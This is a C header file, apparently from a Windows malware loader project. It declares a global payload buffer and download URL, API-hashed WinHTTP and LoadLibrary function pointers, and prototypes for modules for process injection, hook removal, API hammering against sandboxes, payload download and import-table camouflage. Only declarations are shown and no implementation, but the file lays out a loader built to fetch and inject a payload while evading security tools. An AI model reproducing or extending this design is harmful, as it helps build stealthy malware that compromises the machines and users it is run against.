#pragma once
#include <windows.h>
#include <stdio.h>
#include "typedef.h"

//global variables
extern unsigned char* pPayload;
extern PWSTR url;
extern PWSTR endpoint;
extern SIZE_T sSize;

typedef struct _API_HASHING {
    fnGetTickCount64                pGetTickCount64;
    fnWinHttpOpen                   pWinHttpOpen;
    fnWinHttpConnect                pWinHttpConnect;
    fnWinHttpOpenRequest            pWinHttpOpenRequest;
    fnWinHttpSendRequest            pWinHttpSendRequest;
    fnWinHttpReceiveResponse        pWinHttpReceiveResponse;
    fnWinHttpReadData               pWinHttpReadData;
    fnWinHttpCloseHandle            pWinHttpCloseHandle;
    fnLoadLibraryA                  pLoadLibraryA;
} API_HASHING, *PAPI_HASHING;


typedef void*(NTAPI* fnAddVectoredExceptionHandler)(
        ULONG                       First,
        PVECTORED_EXCEPTION_HANDLER Handler
);

typedef long(NTAPI* fnRemoveVectoredExceptionHandler)(
        PVOID Handle
);

// inject.c
#include "inject.h"

//unhook.c
#include "unhook.h"

// apihashing.c
FARPROC GetProcAddressH(IN HMODULE hModule, IN UINT32 uApiHash);
HMODULE GetModuleHandleH(IN UINT32 uModuleHash);

// apihammer.c
BOOL ApiHammering(DWORD Stress);

// downloader.c
DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl);

//iatcamo.c
VOID IatCamouflage();